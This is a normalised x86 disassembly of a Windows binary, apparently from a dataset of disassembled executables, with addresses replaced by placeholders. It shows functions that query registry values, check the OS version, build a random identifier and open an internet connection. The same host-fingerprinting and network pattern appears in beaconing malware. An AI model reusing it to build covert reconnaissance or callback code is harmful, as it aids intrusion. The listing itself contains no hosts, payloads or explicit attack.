mov esi [ RegQueryValueExW@IAT ]
add esp 0x30
mov [ ebp - 0x5d4 ] 0x208
test eax eax
je r-xdata
mov [ ebp - 0x5d4 ] 0x30
test eax eax
je r-xdata
lea ecx [ ebp - 0x5d4 ]
push ecx
lea ecx [ ebp - 0x5d0 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call esi
mov eax [ ebp - 0x5dc ]
mov [ ebp - 0x5d4 ] 0x80
test eax eax
je r-xdata
lea ecx [ ebp - 0x5d4 ]
push ecx
lea ecx [ ebp - 0xc0 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call esi
mov eax [ ebp - 0x5dc ]
mov [ ebp - 0x5d4 ] 0x28
test eax eax
je r-xdata
lea ecx [ ebp - 0x5d4 ]
push ecx
lea ecx [ ebp - 0x1c0 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call esi
mov eax [ ebp - 0x5dc ]
cmp [ ebp - 0x5d0 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x5d4 ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call esi
lea ecx [ ebp - 0x5d0 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x5d0 ]
push eax
mov ecx ebx
call sub_408240
cmp [ ebp - 0xc0 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc0 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
mov ecx [ ebp - 0x5e4 ]
lea eax [ ebp - 0xc0 ]
push eax
call sub_408240
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x1c0 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
mov ecx [ ebp - 0x5e0 ]
lea eax [ ebp - 0x1c0 ]
push eax
call sub_408240
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x60 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x60 ]
push eax
mov ecx edi
call sub_408240
push 0x0
push r--data
push [ edi + 0x10 ]
push ecx
mov ecx edi
call sub_414350
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x5d8 ]
test eax eax
je r-xdata
push 0x3
push r--data
mov ecx edi
call sub_408240
mov eax [ ebp - 0x5dc ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ ebp - 0x5d8 ] 0x0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x10
push eax
call [ RegCloseKey@IAT ]
sub_412260
push ebp
mov ebp esp
push 0xffffffff
push sub_430e77
mov eax [ fs : 0x0 ]
push eax
sub esp 0x608
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x5f8 ] ebx
sub esp 0xc
lea ecx [ ebp - 0x5c0 ]
mov [ ebp - 0x5fc ] eax
mov [ ebp - 0x5c0 ] ebx
mov [ ebp - 0x5bc ] ebx
call sub_4143d0
xor eax eax
push 0x40e
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp - 0x5b4 ] ax
lea eax [ ebp - 0x5b2 ]
push eax
call sub_41cae0
xor eax eax
push 0x5e
push eax
mov [ ebp - 0xa4 ] ax
lea eax [ ebp - 0xa2 ]
push eax
call sub_41cae0
xor eax eax
push 0xfe
push eax
mov [ ebp - 0x1a4 ] ax
lea eax [ ebp - 0x1a2 ]
push eax
call sub_41cae0
xor eax eax
push 0x2e
push eax
mov [ ebp - 0x44 ] ax
lea eax [ ebp - 0x42 ]
push eax
call sub_41cae0
mov eax [ ebp - 0x5c0 ]
mov ecx [ RegQueryValueExW@IAT ]
add esp 0x30
mov [ ebp - 0x5b8 ] 0x208
test eax eax
je r-xdata
mov [ ebp - 0x5b8 ] 0x30
test eax eax
je r-xdata
lea edx [ ebp - 0x5b8 ]
push edx
lea edx [ ebp - 0x5b4 ]
push edx
push ebx
push ebx
push r--data
push eax
call ecx
mov eax [ ebp - 0x5c0 ]
mov ecx [ RegQueryValueExW@IAT ]
mov [ ebp - 0x5b8 ] 0x80
test eax eax
je r-xdata
lea edx [ ebp - 0x5b8 ]
push edx
lea edx [ ebp - 0xa4 ]
push edx
push 0x0
push 0x0
push r--data
push eax
call ecx
mov eax [ ebp - 0x5c0 ]
mov [ ebp - 0x5b8 ] 0x18
test eax eax
je r-xdata
lea ecx [ ebp - 0x5b8 ]
push ecx
lea ecx [ ebp - 0x1a4 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call [ RegQueryValueExW@IAT ]
mov eax [ ebp - 0x5c0 ]
xor eax eax
mov [ ebp - 0x5c8 ] 0x7
mov [ ebp - 0x5cc ] 0x0
mov [ ebp - 0x5dc ] ax
cmp [ ebp - 0xa4 ] ax
jne r-xdata
lea ecx [ ebp - 0x5b8 ]
push ecx
lea ecx [ ebp - 0x44 ]
push ecx
push 0x0
push 0x0
push r--data
push eax
call [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0xa4 ]
lea edx [ ecx + 0x2 ]
nop
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0x5dc ]
call sub_408240
push 0x0
push r--data
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x5cc ]
push ecx
lea ecx [ ebp - 0x5dc ]
call sub_414350
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] 0x0
mov [ ebp - 0x5f4 ] ax
cmp [ ebp - 0xa4 ] ax
jne r-xdata
push 0x5
push r--data
mov ecx esi
call sub_408240
jmp r-xdata
lea ecx [ ebp - 0xa4 ]
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
test bl 0x1
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0x5f4 ]
call sub_408240
lea eax [ ebp - 0x5f4 ]
mov ebx 0x1
cmp esi eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x5c8 ] 0x8
jb r-xdata
and ebx 0xfffffffe
cmp [ ebp - 0x5e0 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x5c8 ] 0x7
mov [ ebp - 0x5cc ] 0x0
mov [ ebp - 0x5dc ] ax
cmp [ ebp - 0x44 ] ax
jne r-xdata
push [ ebp - 0x5dc ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] 0x0
mov [ ebp - 0x5f4 ] ax
push [ ebp - 0x5f4 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x5f4 ]
push eax
mov ecx esi
call sub_40cd80
push [ esi ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x44 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5dc ]
call sub_408240
push 0x0
push r--data
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x5cc ]
push ecx
lea ecx [ ebp - 0x5dc ]
call sub_414350
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] 0x0
mov [ ebp - 0x5f4 ] ax
cmp [ ebp - 0x44 ] ax
jne r-xdata
push 0x5
push r--data
mov ecx edi
call sub_408240
jmp r-xdata
lea ecx [ ebp - 0x44 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
test bl 0x2
je r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x5f4 ]
call sub_408240
lea eax [ ebp - 0x5f4 ]
or ebx 0x2
cmp edi eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x5c8 ] 0x8
jb r-xdata
and ebx 0xfffffffd
cmp [ ebp - 0x5e0 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x5c8 ] 0x7
mov [ ebp - 0x5cc ] 0x0
mov [ ebp - 0x5dc ] ax
cmp [ ebp - 0x5b4 ] ax
jne r-xdata
push [ ebp - 0x5dc ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] 0x0
mov [ ebp - 0x5f4 ] ax
push [ ebp - 0x5f4 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
lea eax [ ebp - 0x5f4 ]
push eax
mov ecx edi
call sub_40cd80
push [ edi ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x5b4 ]
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x5b4 ]
push eax
lea ecx [ ebp - 0x5dc ]
call sub_408240
mov esi [ ebp - 0x5fc ]
lea eax [ ebp - 0x5dc ]
cmp esi eax
je r-xdata
cmp [ ebp - 0x5c8 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x5c8 ] 0x7
mov [ ebp - 0x5cc ] 0x0
mov [ ebp - 0x5dc ] ax
cmp [ ebp - 0x5b4 ] ax
jne r-xdata
push [ ebp - 0x5dc ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x5dc ]
push eax
mov ecx esi
call sub_40cd80
push [ esi ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x5b4 ]
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x5b4 ]
push eax
lea ecx [ ebp - 0x5dc ]
call sub_408240
push 0x0
push r--data
mov [ ebp - 0x4 ] 0x3
push [ ebp - 0x5cc ]
or ebx 0x4
push ecx
lea ecx [ ebp - 0x5dc ]
mov [ ebp - 0x5f8 ] ebx
call sub_414350
test eax eax
jne r-xdata
mov [ ebp - 0x5c1 ] 0x0
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] eax
mov [ ebp - 0x5f4 ] ax
cmp [ ebp - 0xa4 ] ax
jne r-xdata
test bl 0x8
je r-xdata
and ebx 0xffffffef
cmp [ ebp - 0x600 ] 0x8
jb r-xdata
lea ecx [ ebp - 0xa4 ]
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
test bl 0x4
je r-xdata
and ebx 0xfffffff7
cmp [ ebp - 0x5e0 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x600 ] 0x7
mov [ ebp - 0x604 ] 0x0
mov [ ebp - 0x614 ] ax
push [ ebp - 0x614 ]
call j_sub_417912#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0x5f4 ]
call sub_408240
push 0x0
push r--data
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x5e4 ]
or ebx 0x8
push ecx
lea ecx [ ebp - 0x5f4 ]
mov [ ebp - 0x5f8 ] ebx
call sub_414350
test eax eax
jne r-xdata
cmp [ ebp - 0x5c1 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x5bc ]
sete bl
test eax eax
je r-xdata
cmp [ ebp - 0x5c8 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x5e0 ] 0x7
mov [ ebp - 0x5e4 ] 0x0
mov [ ebp - 0x5f4 ] ax
push [ ebp - 0x5f4 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x614 ]
call sub_407fa0
push 0x0
push r--data
mov [ ebp - 0x4 ] 0x5
push [ eax + 0x10 ]
or ebx 0x10
push ecx
mov ecx eax
mov [ ebp - 0x5f8 ] ebx
call sub_414350
mov [ ebp - 0x5c1 ] 0x1
test eax eax
je r-xdata
mov ecx [ ebp - 0x5c0 ]
test ecx ecx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ ebp - 0x5bc ] 0x0
xor eax eax
mov [ ebp - 0x5c8 ] 0x7
mov [ ebp - 0x5cc ] 0x0
mov [ ebp - 0x5dc ] ax
push [ ebp - 0x5dc ]
call j_sub_417912#2
add esp 0x4
test bl 0x10
je r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
push ecx
call [ RegCloseKey@IAT ]
sub_4129e0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
xor ecx ecx
push esi
xor ebx ebx
xor edx edx
xor esi esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] ebx
lea edi [ ecx + 0x1 ]
mov [ ebp + 0x8 ] edx
cmp [ eax + 0x10 ] ecx
jle r-xdata
imul ecx ecx 0x64
add ecx [ ebp - 0xc ]
pop edi
imul ecx ecx 0x64
pop esi
lea eax [ ebx + ecx ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ eax + 0x14 ]
nop
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp ebx 0x8
jb r-xdata
cmp ebx 0x8
jb r-xdata
cmp [ ecx + edx * 2 ] 0x30
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edi 0x1
jne r-xdata
cmp ebx 0x8
jb r-xdata
cmp [ ecx + edx * 2 ] 0x30
jb r-xdata
cmp ebx 0x8
jb r-xdata
cmp [ ecx + edx * 2 ] 0x39
ja r-xdata
cmp edi 0x2
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp edi 0x3
cmove ecx esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] esi
jmp r-xdata
inc edi
xor esi esi
mov ecx [ eax + 0x10 ]
dec ecx
cmp edx ecx
jne r-xdata
cmp [ ecx + edx * 2 ] 0x39
ja r-xdata
movzx edx [ ecx + edx * 2 ]
lea esi [ esi + esi * 4 ]
lea esi [ esi - 0x18 ]
lea esi [ edx + esi * 2 ]
mov edx [ ebp + 0x8 ]
cmp ebx 0x8
jb r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
inc edx
mov [ ebp + 0x8 ] edx
cmp edx [ eax + 0x10 ]
jl r-xdata
sub_412ad0
push ebp
mov ebp esp
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x120 ]
push eax
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x120 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x110 ] 0x2
jne r-xdata
push 0xb
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push r--data
mov ecx esi
mov [ esi ] ax
call sub_408240
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push r--data
mov eax [ ebp - 0x11c ]
cmp eax 0x4
ja r-xdata
cmp eax 0x5
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ ebp - 0x118 ]
test eax eax
jne r-xdata
mov ecx esi
cmp eax 0x7
jb r-xdata
mov eax [ ebp - 0x118 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x6 ] 0x1
mov ecx esi
jne r-xdata
cmp eax 0x2
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov ecx esi
cmp [ ebp - 0x6 ] al
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
cmp eax 0x3
jb r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
call sub_407fa0
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push r--data
jmp r-xdata
sub_412c10
push ebp
mov ebp esp
push 0xffffffff
push sub_430d7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xbc ] 0x0
push 0x5
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push r--data
mov ecx esi
mov [ ebp - 0xf0 ] esi
mov [ esi ] ax
call sub_408240
xor eax eax
mov [ ebp - 0xbc ] 0x1
mov [ ebp - 0x5c ] 0x7
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] ax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x58 ] ax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x40 ] ax
push 0x4
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3
call sub_408240
lea ecx [ ebp - 0x58 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_408340
push 0x0
call sub_419811
push eax
call sub_419982
call sub_41995f
cdq
mov ecx 0x64
idiv ecx
lea eax [ ebp - 0x28 ]
push edx
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x14
mov edx 0x1
lea ecx [ ebp - 0x70 ]
call sub_411630
mov edx 0x2
lea ecx [ ebp - 0x58 ]
call sub_411630
lea eax [ ebp - 0x88 ]
push eax
call sub_412ad0
mov ebx eax
lea eax [ ebp - 0x40 ]
cmp eax ebx
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_408340
cmp [ ebp - 0x74 ] 0x8
jb r-xdata
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_414080
push r--data
mov edx eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x4
call sub_410d60
lea ecx [ ebp - 0x58 ]
push ecx
mov edx eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x5
call sub_414140
add esp 0xc
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x6
call sub_410f30
cmp [ ebp - 0x8c ] 0x8
jb r-xdata
push [ ebp - 0x88 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
push ebx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
call sub_40cd80
push [ ebp - 0x40 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0xa4 ] 0x8
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] ax
jb r-xdata
push [ ebp - 0xa0 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x74 ] 0x8
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] 0x0
mov [ ebp - 0xb8 ] ax
jb r-xdata
push [ ebp - 0xb8 ]
call j_sub_417912#2
add esp 0x4
push 0x7
push ecx
push r--data
mov ecx edi
call sub_408130
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x88 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0xec ]
call sub_414080
push r--data
mov edx eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xd
call sub_410d60
push edi
mov edx eax
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xe
call sub_414140
add esp 0xc
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xf
call sub_410f30
cmp [ ebp - 0x74 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x8c ] 0x7
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] ax
cmp [ ebp - 0x28 ] ax
jne r-xdata
xor eax eax
cmp [ ebp - 0xc0 ] 0x8
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] ax
jb r-xdata
push [ ebp - 0x88 ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x28 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
xor eax eax
cmp [ ebp - 0xd8 ] 0x8
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] 0x0
mov [ ebp - 0xd4 ] ax
jb r-xdata
push [ ebp - 0xd4 ]
call j_sub_417912#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0xa0 ]
call sub_408240
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x7
call sub_414080
push r--data
mov edx eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x8
call sub_410d60
push edi
mov edx eax
lea ecx [ ebp - 0xec ]
mov [ ebp - 0x4 ] 0x9
call sub_414140
push r--data
mov edx eax
lea ecx [ ebp - 0x108 ]
mov [ ebp - 0x4 ] 0xa
call sub_410d60
lea ecx [ ebp - 0xa0 ]
push ecx
mov edx eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xb
call sub_4141c0
add esp 0x14
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_410f30
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
push [ ebp - 0xec ]
xor eax eax
cmp [ ebp - 0xf4 ] 0x8
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] 0x0
mov [ ebp - 0xb8 ] ax
jb r-xdata
push [ ebp - 0xb8 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0x44 ] 0x8
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0xd8 ] 0x8
mov [ ebp - 0xf4 ] 0x7
mov [ ebp - 0xf8 ] 0x0
mov [ ebp - 0x108 ] ax
jb r-xdata
push [ ebp - 0x108 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0x5c ] 0x8
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
jb r-xdata
push [ ebp - 0x58 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0xc0 ] 0x8
mov [ ebp - 0xd8 ] 0x7
mov [ ebp - 0xdc ] 0x0
mov [ ebp - 0xec ] ax
jb r-xdata
push [ ebp - 0xec ]
call j_sub_417912#2
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x70 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0x74 ] 0x8
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] 0x0
mov [ ebp - 0xd4 ] ax
jb r-xdata
push [ ebp - 0xd4 ]
call j_sub_417912#2
add esp 0x4
xor eax eax
cmp [ ebp - 0x8c ] 0x8
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] ax
jb r-xdata
push [ ebp - 0x88 ]
call j_sub_417912#2
add esp 0x4
push [ ebp - 0xa0 ]
jmp r-xdata
call j_sub_417912#2
add esp 0x4
sub_413190
push ebp
mov ebp esp
push 0xffffffff
push sub_430bd6
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x7d528
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor eax eax
push eax
push r--data
lea ecx [ ebp - 0x7d488 ]
mov [ ebp - 0x7d500 ] edi
mov [ ebp - 0x7d504 ] 0x0
mov [ ebp - 0x7d474 ] 0x7
mov [ ebp - 0x7d478 ] 0x0
mov [ ebp - 0x7d488 ] ax
call sub_408240
xor eax eax
push 0x206
mov [ ebp - 0x4 ] 0x0
push eax
mov [ ebp - 0x468 ] ax
lea eax [ ebp - 0x466 ]
push eax
call sub_41cae0
xor eax eax
push 0x206
push eax
mov [ ebp - 0x260 ] ax
lea eax [ ebp - 0x25e ]
push eax
call sub_41cae0
push 0x3c
lea eax [ ebp - 0x7d4e8 ]
push 0x0
push eax
call sub_41cae0
lea eax [ ebp - 0x468 ]
mov [ ebp - 0x7d4d8 ] eax
lea eax [ ebp - 0x260 ]
add esp 0x24
cmp [ esi + 0x14 ] 0x8
mov [ ebp - 0x7d4bc ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x7d4e8 ] 0x3c
mov [ ebp - 0x7d4b4 ] 0x0
mov [ ebp - 0x7d4b0 ] 0x0
mov [ ebp - 0x7d4d4 ] 0x103
mov [ ebp - 0x7d4c4 ] 0x0
mov [ ebp - 0x7d4c0 ] 0x0
mov [ ebp - 0x7d4e4 ] 0x0
mov [ ebp - 0x7d4e0 ] 0x0
mov [ ebp - 0x7d4b8 ] 0x103
jb r-xdata
lea ecx [ ebp - 0x7d4e8 ]
push ecx
push 0x80000000
push eax
push esi
call [ InternetCrackUrlW@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
mov [ ebp - 0x7d4f4 ] 0x0
mov [ ebp - 0x7d4f8 ] 0x0
mov [ ebp - 0x7d4e9 ] 0x1
mov [ ebp - 0x7d48c ] 0xf
mov [ ebp - 0x7d490 ] 0x0
mov [ ebp - 0x7d4a0 ] 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x7d474 ] 0x8
push 0x0
lea eax [ ebp - 0x7d488 ]
cmovae eax [ ebp - 0x7d488 ]
push 0x0
push eax
call [ InternetOpenW@IAT ]
mov [ ebp - 0x7d4fc ] eax
test eax eax
jne r-xdata
push eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] eax
push r--data
mov ecx edi
mov [ edi ] al
